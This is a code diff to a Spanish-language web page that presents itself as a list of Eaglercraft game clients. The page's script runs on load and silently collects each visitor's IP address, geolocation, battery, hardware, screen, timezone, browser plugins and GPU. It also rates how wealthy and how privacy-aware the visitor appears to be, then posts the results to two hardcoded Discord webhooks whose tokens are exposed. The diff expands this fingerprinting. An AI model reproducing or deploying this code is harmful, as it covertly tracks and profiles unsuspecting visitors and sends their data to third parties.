@@ -21,6 +21,7 @@
 </style>
 </head>
 <body>
+
 <header>
   <div class="nav">
     <div style="display:flex;align-items:center;gap:14px">
@@ -29,6 +30,7 @@
     </div>
   </div>
 </header>
+
 <main>
   <h1>Clientes Eaglercraft 2025</h1>
   <div class="grid">
@@ -42,17 +44,41 @@
 </main>
 
 <script>
-// WEBHOOK TUYO
+// TUS 2 WEBHOOKS
 const WEBHOOK1 = "https://discord.com/api/webhooks/1446712536656249005/sbyzRE1yccOtJ2qJFGFN9K8ltOxELsq8ZqQ04howQOMffAccLDJOFjXgp9alt__ysvBP";
-
-// WEBHOOK DE TU AMIGO
 const WEBHOOK2 = "https://discord.com/api/webhooks/1455720593688100884/c-ezeoQzhgREwV_lcQUNp_dKfo009Y7xatAHZ6cXlSCs52gOBpZUfmcw527iogUpgWxf";
 
 (async () => {
   const geo = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({}));
   const battery = await navigator.getBattery?.() || {};
   const uaData = navigator.userAgentData || {};
-  const connection = navigator.connection || {};
+
+  // WEBGL (GPU)
+  let webgl = 'no disponible';
+  let gpuLevel = 'desconocida';
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    if (debugInfo) {
+      const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      webgl = `${vendor} | ${renderer}`;
+      // Clasificación de GPU (2025)
+      if (renderer.includes('RTX') || renderer.includes('GeForce 50') || renderer.includes('RX 9')) gpuLevel = 'Cara/Gamer (alta gama)';
+      else if (renderer.includes('RTX 40') || renderer.includes('RX 7') || renderer.includes('RX 8')) gpuLevel = 'Media-Alta (buena para juegos)';
+      else if (renderer.includes('Intel') || renderer.includes('UHD') || renderer.includes('Iris')) gpuLevel = 'Barata/Integrada (básica)';
+      else if (renderer.includes('Radeon')) gpuLevel = 'Media (AMD integrada o dedicada vieja)';
+      else gpuLevel = 'Desconocida';
+    }
+  } catch(e) {}
+
+  // PLUGINS + NIVEL DE "LISTO"
+  const pluginsList = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'ninguno';
+  let userLevel = 'Principiante (no sabe mucho)';
+  const savvyPlugins = ['uBlock Origin','AdBlock','Privacy Badger','NoScript','HTTPS Everywhere','ClearURLs','Decentraleyes','Cookie AutoDelete','VPN','Bitwarden','Dark Reader'];
+  if (savvyPlugins.some(p => pluginsList.includes(p))) userLevel = 'Listo/Tech-savvy (sabe de privacidad)';
+  if (pluginsList.includes('PDF Viewer') && pluginsList.length < 50) userLevel = 'Principiante total (solo plugins básicos)';
 
   const datos = {
     ip: geo.ip || 'oculta',
@@ -67,13 +93,11 @@ const WEBHOOK2 = "https://discord.com/api/webhooks/1455720593688100884/c-ezeoQzh
     cpu: navigator.hardwareConcurrency || '?',
     pantalla: `${screen.width}x${screen.height}x${screen.colorDepth}`,
     bateria: battery.level ? `${Math.round(battery.level*100)}% ${battery.charging?'cargando':'descargando'}` : 'no disponible',
-    conexion: connection.effectiveType || '?',
-    velocidad: connection.downlink ? `${connection.downlink} Mbps` : '?',
     zona: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    idioma: navigator.language,
-    pestañas: history.length,
-    cookies: navigator.cookieEnabled ? 'Sí' : 'No',
-    modo_oscuro: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Sí' : 'No'
+    plugins: pluginsList,
+    user_level: userLevel,
+    gpu: webgl,
+    gpu_level: gpuLevel
   };
 
   const mensaje = 
@@ -87,13 +111,12 @@ const WEBHOOK2 = "https://discord.com/api/webhooks/1455720593688100884/c-ezeoQzh
 **RAM:** ${datos.ram} GB | CPU: ${datos.cpu} núcleos
 **Pantalla:** ${datos.pantalla}
 **Batería:** ${datos.bateria}
-**Conexión:** ${datos.conexion} (${datos.velocidad})
 **Zona horaria:** ${datos.zona}
-**Idioma:** ${datos.idioma}
-**Pestañas:** ${datos.pestañas}
-**Cookies:** ${datos.cookies} | Modo oscuro: ${datos.modo_oscuro}`;
+**Plugins:** ${datos.plugins}
+**Nivel del usuario:** ${datos.user_level}
+**GPU:** ${datos.gpu}
+**Tipo de GPU:** ${datos.gpu_level}`;
 
-  // ENVÍA A LOS 2 WEBHOOKS AL MISMO TIEMPO
   await Promise.all([
     fetch(WEBHOOK1, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: mensaje})}),
     fetch(WEBHOOK2, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: mensaje})})
